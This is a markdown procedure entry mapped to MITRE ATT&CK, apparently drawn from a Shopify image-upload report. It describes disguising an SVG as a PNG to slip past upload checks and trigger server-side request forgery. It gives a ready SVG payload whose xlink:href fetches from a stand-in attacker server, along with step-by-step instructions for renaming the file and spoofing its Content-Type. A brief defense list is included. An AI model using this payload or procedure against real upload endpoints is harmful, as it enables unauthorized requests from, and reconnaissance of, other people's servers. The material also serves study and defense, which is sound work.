---
tags:
  - ssrf
  - svg
  - file-disguise
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: eb346349-5585-4f67-9bd1-ca9dbd2d4306
created_at: '2025-12-14T03:46:14.389Z'
updated_at: '2025-12-14T03:46:14.389Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Disguise SVG as PNG for Upload

## Summary

This procedure creates an SVG file with external resource references and disguises it as a PNG to bypass initial file type validation in upload endpoints, setting up SSRF exploitation.

## Description

In the Shopify image upload, the server processes SVG content using a parser (likely GraphicsMagick) before validating the file type, allowing external requests via attributes like xlink:href. The attack renames the SVG to .png and sets appropriate Content-Type, but embeds raw SVG. This targets web applications with lax upload checks.

## Requirements

1. Text editor or script to generate SVG payload
2. Attacker server hosting the external resource (e.g., image.jpeg)
3. Knowledge of target upload endpoint

## Defense

Defensive measures and detection strategies:

- Validate file content against extension and Content-Type using magic bytes
- Disable external resource fetching in image parsers (e.g., configure GraphicsMagick sandbox)
- Monitor outbound HTTP/FTP from image processing services

## Objectives

1. Evade upload filters to trigger SVG parsing
2. Embed external URL for SSRF
3. Prepare payload for reconnaissance

## Instructions

### Step 1: Create SVG Payload

**Context**: Build the SVG with an external image reference to trigger SSRF.

Create a file named payload.svg:

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image xlink:href="http://attacker-server/image.jpeg" />
</svg>
```

> This SVG references an external JPEG, causing the parser to fetch it during processing.

### Step 2: Disguise as PNG

**Context**: Rename and prepare for upload to mimic a legitimate image.

Rename payload.svg to payload.png. When uploading, use Content-Type: image/png in the multipart form, but send the SVG content as the file body.

> Ensures the server treats it as PNG initially but parses as SVG.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[ssrf]]
- [[svg-upload]]
